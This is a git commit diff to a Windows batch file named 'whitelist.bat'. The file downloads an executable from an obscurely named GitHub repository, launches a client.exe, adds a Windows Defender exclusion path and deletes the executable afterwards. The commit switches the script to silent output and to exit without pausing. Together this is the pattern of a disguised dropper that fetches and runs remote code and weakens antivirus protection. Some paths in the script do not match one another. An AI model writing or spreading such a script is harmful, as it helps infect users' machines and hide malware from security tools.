ecb01c7d81cbe4a807f4b9f7297b14337654c171
BlaBlak3 <93101797+BlaBlak3@users.noreply.github.com>
2021-11-03 21:49:37 -0400

    Update whitelist.bat

--- whitelist.bat
+++ whitelist.bat
@@ -1,8 +1,8 @@
-@echo on
+@echo off
 powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/raw/main/client.exe -Outfile client.exe"
 start C:\Windows\client.exe
 powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
 timeout 2 > NULL
 del C:\Windows\client.exe
 powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
-pause
+exit
